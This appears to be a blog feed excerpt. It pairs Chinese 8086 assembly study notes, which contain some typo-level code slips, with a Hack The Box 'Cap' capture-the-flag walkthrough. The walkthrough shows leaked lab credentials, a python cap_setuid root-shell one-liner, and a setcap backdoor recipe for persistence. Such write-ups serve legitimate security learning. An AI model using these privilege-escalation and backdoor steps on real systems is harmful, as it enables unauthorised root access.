class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>code segment<br>start:mov ax,cs<br>mov ds,ax<br>mov si,offset do0//设置 ds:si 指向源地址<br>mov ax,0<br>mov es,ax<br>mov di,200h//设置 es:di 指向目的地址<br>mov cx,offset do0end-offset do0//设置 cx 为传输长度<br>cld//传输方向为正<br>rep movsb<br>设置中断向量表<br><br>mov ax,4c0h<br>int 21h<br><br>   do0:jmp short do0start//”overflow！”不是可执行代码，jmp 转移到正式 do0 程序。除法发生溢出时，CPU 执行0:200处的 jmp 指令，跳过后面字符串，转到正式 do0 程序执行<br>   db &quot;overflow!&quot;<br>  do0start:mov ax,cs<br>  mov ds,ax<br>  mov si,202h//ds:si指向字符串，jmp 指令占两个字节，所以偏移地址为 202h<br>  <br>  mov ax,0b800h<br>  mov es,ax<br>  mov di,12*160+36*2//es:di指向显存空间的中间位置<br>  <br>  mov cx,9//cx为字符串长度<br>  s:mov al,[si]<br>  mov es:[di],al<br>  inc si<br>  add di,2<br>  loop s<br>  <br>  mov ax,4c00h<br>  int 21h<br>  <br>de0end:nop<br>code:ends<br>end start<br>//将标号 do0 到标号 do0end 之间的内容送到 0000:0200处  <br></code></pre></td></tr></table></figure><h3 id="12-10-设置中断向量"><a href="#12-10-设置中断向量" class="headerlink" title="12.10 设置中断向量"></a>12.10 设置中断向量</h3><p>将 do0 的入口地址 0:200 写入中断向量表的 0 号表项中，使 do0 成为  0 号中断的中断处理程序</p><p>0 号表项的地址为 0：0，其中 0：0 字单元存放偏移地址，0：2字单元存放段地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0<br>mov es,ax<br>mov word ptr es:[0*4],200h<br>mov word ptr es:[0*4+2],0<br></code></pre></td></tr></table></figure><h3 id="12-11-单步中断"><a href="#12-11-单步中断" class="headerlink" title="12.11 单步中断"></a>12.11 单步中断</h3><p>CPU 在执行完一条指令后，如果检测到标志寄存器的 TF 位为 1，则产生单步中断，引发中断过程。</p><ul><li>取得中断类型码为 1</li><li>标志寄存器入栈，TF、IF 设置为 0</li><li>CS、IP 入栈</li><li>（IP）&#x3D;（1*4），（CS）&#x3D;（1*4+2）</li></ul><h1 id="十三、int-指令"><a href="#十三、int-指令" class="headerlink" title="十三、int 指令"></a>十三、int 指令</h1><h3 id="13-1-int-指令"><a href="#13-1-int-指令" class="headerlink" title="13.1 int 指令"></a>13.1 int 指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">int n<br></code></pre></td></tr></table></figure><h3 id="13-2-编写中断例程"><a href="#13-2-编写中断例程" class="headerlink" title="13.2 编写中断例程"></a>13.2 编写中断例程</h3><p>安装中断 7ch 的中断例程</p><p>功能：将一个全是字母，以 0 结尾的字符串，转化为大写</p><p>参数：ds:si 指向字符串的首地址</p><p>eg. 将 data 段中的字符串转化为大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>data segment<br>db &#x27;conversation&#x27;,0<br>data ends<br>code segment<br>start:mov ax,data<br>mov ds,ax<br>mov si,0<br>int 7ch<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>安装程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br><br>start:mov ax,cs<br>mov ds,ax<br>mov si,offset capital<br>cld<br>rep movsb<br><br>mov ax,0<br>mov es,ax<br>mov word ptr es:[7ch*4],200h<br>mov word ptr es:[7ch*4+2],0<br>mov ax,4c00h<br>int 21h<br><br> capital:push cx<br> push si<br> change:mov cl,[si]<br> mov ch,0<br> jcxz ok<br> and byte ptr [si],11011111b<br> inc si<br> jmp short change<br> ok:pop si<br> pop cx<br> iret<br>capitalend:nop<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="13-3-对-int、iret-和栈的理解"><a href="#13-3-对-int、iret-和栈的理解" class="headerlink" title="13.3 对 int、iret 和栈的理解"></a>13.3 对 int、iret 和栈的理解</h3><p>e.g 在屏幕中显示 80 个 “ ! ”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,0b800h<br> mov es,ax<br> mov di,160*12<br> <br> mov bx,offset s-offset se//从标号 se 到标号 s 的转移位移<br> mov cx,80<br> s:mov byte ptr es:[di],&#x27;!&#x27;<br> add di,2<br> int 7ch//(cx)!=0，转移到标号 s 处<br> se:nop<br> mov ax,4c0h<br> int 21h<br> code ends<br> end start<br></code></pre></td></tr></table></figure><h3 id="13-4-BIOS-和-DOS-所提供的中断例程"><a href="#13-4-BIOS-和-DOS-所提供的中断例程" class="headerlink" title="13.4 BIOS 和 DOS 所提供的中断例程"></a>13.4 BIOS 和 DOS 所提供的中断例程</h3><p>在系统板的 ROM 位置存放一套程序，BIOS （基本输入输出系统），主要包含以下内容：</p><ul><li>硬件系统的检测和初始化程序</li><li>外部中断和内部中断的中断例程</li><li>用于硬件设备进行 I&#x2F;O 操作的中断例程</li><li>其他和硬件系统相关的中断例程</li></ul><p>&#x2F;&#x2F;e.g 下面程序在第2、4、6、8行显示 4 句英文诗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> s1:db &#x27;Good,better,best,&#x27;,&#x27;$&#x27;<br> s2:db &#x27;Never let it rest,&#x27;,&#x27;$&#x27;<br> s3:db &#x27;Till good is better,&#x27;,&#x27;$&#x27;<br> s4:db &#x27;And better,best.&#x27;,&#x27;$&#x27;<br> s:dw offset s1,offset s2,offset s3,offset s4<br>   row:db 2,4,6,8<br>   <br>  start:mov ax,cs<br>  mov ds,ax<br>  mov bx,offset s<br>  mov si,offset row<br>  mov cx,4<br>  ok:mov bh,0<br>  mov dh,<br>   <br></code></pre></td></tr></table></figure><h1 id="十四、端口"><a href="#十四、端口" class="headerlink" title="十四、端口"></a>十四、端口</h1><p>寄存器相同特点：</p><ul><li>都和 CPU 总线相连，通过它们所在的芯片进行</li><li>CPU 对它们进行读或写的时候都通过控制线向它们所在的芯片发出端口号读写命令</li></ul><p>CPU 可以直接读写以下地方的数据：</p><ul><li>CPU 内部的寄存器</li><li>内存单元</li><li>端口</li></ul><h3 id="14-1-端口的读写"><a href="#14-1-端口的读写" class="headerlink" title="14.1 端口的读写"></a>14.1 端口的读写</h3><p>1）访问内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,ds:[8]//假设执行前(ds)=0<br></code></pre></td></tr></table></figure><ul><li>CPU 通过地址线将地址信息 8 发出</li><li>CPU 通过控制线发出内存读命令，选中存储器芯片，通知他它要从中读取数据</li><li>存储器将 8 号单元中的数据通过数据线送入 CPU</li></ul><p>2）访问端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al,60h//从 60h 号端口读入一个字节<br></code></pre></td></tr></table></figure><ul><li>CPU 通过地址线将地址信息 60h 发出</li><li>CPU 通过控制线发出端口命令，选中端口所在的芯片，通知他要从中读取数据</li><li>端口所在的芯片将 60h 端口中的数据通过数据线送入 CPU</li></ul><p>在 in 和 out 指令中，只能用 ax 和 al 来存放从端口中读入的数据或要发送到端口的数据。访问 8 位端口时用 al ,访问 16 位用 ax</p><p>对0~255以内端口进行读写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al,20h//从 20h 端口读入一个字节<br>out 20h,al//往 20h 端口写入一个字节<br></code></pre></td></tr></table></figure><p>对 256~65535 的端口进行读写，端口号放在 dx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dx,3f8h//将端口号 3f8h 送入 dx<br>in al,dx//读入<br>out dx,al//写入<br></code></pre></td></tr></table></figure><h3 id="14-2-CMOS-RAM-芯片"><a href="#14-2-CMOS-RAM-芯片" class="headerlink" title="14.2 CMOS RAM 芯片"></a>14.2 CMOS RAM 芯片</h3><ul><li>包含一个实时钟和一个有 128 个存储单元的 RAM 存储器</li><li>128 个字节的 RAM 中，内部实时钟占用 0~0dh 单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时 BIOS 程序读取</li><li>芯片内部有两个端口，存放要访问的 CMOS RAM 单元的地址；71h 为数据端口，存放从选定的 CMOS RAM 单元中读取的数据，或要写入到其中的数据。CPU 对 CMOS RAM 的读写分两步进行，读 CMOS RAM 的 2 号单元<ul><li>将 2 送入端口 70h</li><li>从端口 70h 读出 2 号单元的内容</li></ul></li></ul><h3 id="14-3-shl-和-shr-指令"><a href="#14-3-shl-和-shr-指令" class="headerlink" title="14.3 shl 和 shr 指令"></a>14.3 shl 和 shr 指令</h3><p>shl 是逻辑左移指令</p><ul><li>将一个寄存器或内存单元中的数据向左移位</li><li>将最后移出的一位写入 CF 中</li><li>最低位用 0 补充</li></ul><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01001000b<br>shl al,1//左移 1 位<br>//(al)=10010000b<br></code></pre></td></tr></table></figure><p><strong>如果移动位数大于 1 时，必须将移动位数放在 cl 中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01010001b<br>mov cl,3<br>shl,al,cl<br>//执行后 (al)=10001000b,最后移出的一位是 0,所以 CF=0<br></code></pre></td></tr></table></figure><p>shr 是逻辑右移指令</p><ul><li>向右移位</li><li>最后移出的一位写入 CF 中</li><li>最高位用 0 补充</li></ul><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,10000001b<br>shr al,1//右移<br>//(al)=01000000b,CF =1<br></code></pre></td></tr></table></figure><p>e.g 用加法和移位指令计算 (ax)&#x3D;(ax)*10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>start:mov bx,ax<br>shl,ax,1<br>mov cl,3<br>shl bx,cl//左移 3 位,(bx)=(ax)*8<br>add ax,bx//(ax)=(ax)*2+(ax)*8<br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br><br></code></pre></td></tr></table></figure><h1 id="十五、外中断"><a href="#十五、外中断" class="headerlink" title="十五、外中断"></a>十五、外中断</h1><h3 id="15-2-外中断信息"><a href="#15-2-外中断信息" class="headerlink" title="15.2 外中断信息"></a>15.2 外中断信息</h3><p>1）可屏蔽中断</p><p>CPU 可以不响应的外中断，如果 IF &#x3D; 0，CPU 可以不响应可屏蔽中断</p><p>sti ,设置 IF &#x3D;1</p><p>cli ,设置 IF &#x3D;0</p><p><strong>几乎所有由外设引发的中断都是可屏蔽中断</strong></p><p>2）不可屏蔽中断</p><p>对于 8086CPU ，不可屏蔽中断类型码固定为2，所以中断过程中，不需要取中断类型码，过程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">标志寄存器入,IF=0,TF=0<br>CS、IP 入栈<br>(IP)=(8),(CS)=(0AH0)<br></code></pre></td></tr></table></figure><h1 id="指令系统总结"><a href="#指令系统总结" class="headerlink" title="指令系统总结"></a>指令系统总结</h1><h3 id="1-数据传送指令"><a href="#1-数据传送指令" class="headerlink" title="1. 数据传送指令"></a>1. 数据传送指令</h3><p>mov 、sub 、push、pop、pushf、popf、xchg等都是数据传送指令，实现寄存器和内存、寄存器和寄存器之间的单个数据传送</p><h3 id="2-算术运算指令"><a href="#2-算术运算指令" class="headerlink" title="2. 算术运算指令"></a>2. 算术运算指令</h3><p>add、sub、adc、sbb、inc、dec、cmp、imul、idiv、aaa等，实现寄存器和内存中的数据的算数运算，执行结果影响寄存器的 sf、zf、of、cf、pf、af位</p><h3 id="3-逻辑指令"><a href="#3-逻辑指令" class="headerlink" title="3. 逻辑指令"></a>3. 逻辑指令</h3><p>add、or、not、xor、test、shl、shr、sal、sar、rol、ror、rcl、rcr等，除了 not 外，执行结果都影响标志寄存器的相关标志位</p><h3 id="4-转移指令"><a href="#4-转移指令" class="headerlink" title="4. 转移指令"></a>4. 转移指令</h3><p>可以修改 IP ，或者同时修改 CS 和 IP</p><p>1）无条件转移指令，比如，jmp</p><p>2）条件转移指令，比如，jcxz，je，jb，ja，jnb，jna等</p><p>3）循环指令，比如，loop</p><p>4）过程，比如，call、ret、retf</p><p>5）中断，比如，int、iret</p><h3 id="5-处理机控制指令"><a href="#5-处理机控制指令" class="headerlink" title="5. 处理机控制指令"></a>5. 处理机控制指令</h3><p>cld、std、cli、sti、nop、clc、cmc、stc、hlt、wait、esc、lock等</p><h3 id="6-串处理指令"><a href="#6-串处理指令" class="headerlink" title="6. 串处理指令"></a>6. 串处理指令</h3><p>movsb、movsw、cmps、scas、lods、stos等，可搭配 rep、repe、repne等使用</p><h1 id="十六、直接定址表"><a href="#十六、直接定址表" class="headerlink" title="十六、直接定址表"></a>十六、直接定址表</h1><h3 id="16-2-在其他段中使用数据标号"><a href="#16-2-在其他段中使用数据标号" class="headerlink" title="16.2 在其他段中使用数据标号"></a>16.2 在其他段中使用数据标号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>a db 1,2,3,4,5,6,7,8<br>b dw 0<br>c dd a,b<br>data ends<br></code></pre></td></tr></table></figure><p>标号 c 处存储的两个双字节型数据为标号 a 的偏移地址和段地址、标号 b 的偏移地址和段地址 ,相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>a db 1,2,3,4,5,6,7,8<br>b dw 0<br>c dw offset a,seg a,offset b,seg b<br>data ends<br>//seg 操作符，功能为取得某一标号的段地址<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Cap &amp; UnderPass</title>
    <link href="/2025/03/12/HTB-Cap-UnderPass/"/>
    <url>/2025/03/12/HTB-Cap-UnderPass/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/HTB/Machine/Cap]<br>└─# nmap -p- -T4 --min-rate=<span class="hljs-number">1000</span> -sS -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">11</span> <span class="hljs-number">14</span>:<span class="hljs-number">39</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">30</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">65532</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp open  ftp<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">86</span>.<span class="hljs-number">05</span> seconds<br></code></pre></td></tr></table></figure><p>开着 21、22、80</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:3<br></code></pre></td></tr></table></figure><h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><p>访问 80 端口，侧边栏找到 <code>Security Snapshot</code> ，查看 url</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">After running <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;Security Snapshot&quot;</span>, <span class="hljs-keyword">the</span> browser is redirected <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> path <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">format</span> /[something]/[id], where [id] represents <span class="hljs-keyword">the</span> id <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> scan. What is <span class="hljs-keyword">the</span> [something]?<br>:data<br></code></pre></td></tr></table></figure><h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><p>查看侧边栏的 <code>Network Status</code> 发现还有其他 IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/a8fafe0bc546ec32.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Are you able <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">to</span> other users<span class="hljs-string">&#x27; scans?</span><br><span class="hljs-string">:yes</span><br></code></pre></td></tr></table></figure><h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> ID <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> PCAP <span class="hljs-built_in">file</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">contains</span> sensative data?<br>:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h2><p>在 <code>http://10.10.10.245/data/0</code> 下载数据包</p><p><img src="https://img.dkdun.cn/v1/2025/12/8f2ffd0671c11359.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which application layer protocol <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> pcap <span class="hljs-built_in">file</span> can <span class="hljs-keyword">the</span> sensetive data be found <span class="hljs-keyword">in</span>?<br>:<span class="hljs-keyword">ftp</span><br></code></pre></td></tr></table></figure><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">nathan</span><br>PASS Buck3tH4TF0RM3!<br></code></pre></td></tr></table></figure><p>ssh 也能用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">W<span class="hljs-string">e&#x27;ve managed to collect nathan&#x27;</span>s FTP <span class="hljs-keyword">password</span>. <span class="hljs-keyword">On</span> what other service does this <span class="hljs-keyword">password</span> <span class="hljs-keyword">work</span>?<br>:ssh<br></code></pre></td></tr></table></figure><h2 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ftp <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>get user.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/752db83161eb57c2.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in the nathan user&#x27;s home directory.<br>:<span class="hljs-number">12298311</span>c<span class="hljs-number">4131</span>1a3b59b<span class="hljs-number">4887</span>9e6c07ff<br></code></pre></td></tr></table></figure><h2 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h2><p>传一个 <code>linpeas.sh</code> 上去，在 <code>Capabilities</code> 下看到了 <code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/957af3fac15cccef.png"></p><p>还可以直接查找</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">getcap -r / <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">full</span> <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> the binary <span class="hljs-keyword">on</span> this machine has special capabilities that can be abused <span class="hljs-keyword">to</span> obtain root <span class="hljs-keyword">privileges</span>?<br>:/usr/bin/python3<span class="hljs-number">.8</span><br></code></pre></td></tr></table></figure><h2 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h2><p>执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3<span class="hljs-number">.8</span> -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>进入 root 权限</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in root&#x27;s home directory.<br>:<span class="hljs-number">07860203</span>4d5abb<span class="hljs-number">9587</span>c86b9f<span class="hljs-number">7560</span>ab18<br></code></pre></td></tr></table></figure><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p><p>如果二进制文件具有 Linux <code>CAP_SETUID</code> 功能集或者具有功能集的另一个二进制文件执行，可以用作后门，通过操作自己的进程 UID 来维持权限访问</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">cp $(which python) .<br>sudo setcap cap_setuid+ep python<br><br>./python -c &#x27;import os; os.setuid(<span class="hljs-number">0</span>); os.system(&quot;/bin/sh&quot;)&#x27;<br></code></pre></td></tr></table></figure><p><code>Capabilities</code> 机制在 Linux 内核 2.2 之后引入，它将 root 用户权限细分为不同领域，可以禁用或启用。如果 euid 不是 root ，那么会检查是否具有特权操作所对应的 <code>Capabilities</code>，以此为依据来决定是否能执行权限操作，主要是针对 SUID 的权限控制</p><p>上述的 <code>CAP_SETUID</code> 就是改变进程的 uid(setuid(),setreuid(),setresuid() 等等) 对应的 capability </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os; os.setuid(<span class="hljs-number">0</span>); os.system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br></code></pre></td></tr></table></figure><p>更多详情可以看大佬们的博客：<a href="https://www.cnblogs.com/f-carey/p/16026088.html%EF%BC%8Chttps://rk700.github.io/2016/10/26/linux-capabilities/">https://www.cnblogs.com/f-carey/p/16026088.html，https://rk700.github.io/2016/10/26/linux-capabilities/</a></p><h1 id="UnderPass"><a href="#UnderPass" class="headerlink" title="UnderPass"></a>UnderPass</h1><h2 id="Submit-User-Flag-1"><a href="#Submit-User-Flag-1" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# nmap -sS -sV -Pn -A <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span> <span class="hljs-number">17</span>:<span class="hljs-number">14</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">33</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span 